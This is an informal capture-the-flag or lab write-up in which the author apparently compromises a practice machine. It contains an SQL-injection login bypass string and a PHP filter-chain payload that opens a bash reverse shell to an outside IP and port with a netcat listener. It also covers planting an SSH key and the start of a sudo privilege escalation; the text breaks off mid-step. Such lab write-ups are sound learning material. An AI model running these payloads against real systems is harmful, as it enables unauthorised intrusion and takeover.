
i used nmap to discover open ports and after i found there is all ports open.
but i used 22,80 ports to discover flags.

tools i used and for what-
1. nmap :- scan ports and get info
2. php-chain-generator-py from github :- i used to make payload for it
3. xxd :- not a tool some kind a trick i think

# STEP 1

i used nmap to scan target ip and then i saw every ports opened.so i use only 80,22 to attack

# STEP 2

next i found login page in port 80 running web server and i tried basic payloads to enter without password.. this one works

```
' ||'1'='1';-- -
```

so i enter there and saw the version of apache httpd and i found it may vulnerable.i did small research to find anything usefull and i found php generator python program.
 
# STEP 3

using the python program i made a payload and i copied it and paste after `php?file=` .and send it and i made listener to catch the web shell using net cat.


 `python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.17.12.215/4444 0>&1\"'); ?>" | grep "^php" > payload.txt`

```
nc -lvnp 4444
```

and yeah i got shell. but i cant read user flag.
i found /etc/comte/.ssh/... file is readable using echo command.

so i replaced key with my ssh pub key.and then using it i loging ssh comte@ by without password

and then i reade user text file the first flag where was. 

# STEP 4

ssh privilege exultation.

i used sudo -l to see what i can do without root privileges. 


i found 
`systemctl restart exploit.time`
and some other files

i using nano did small changes to file that and run it..i found there xxd.

so i went to that directory and ran commands

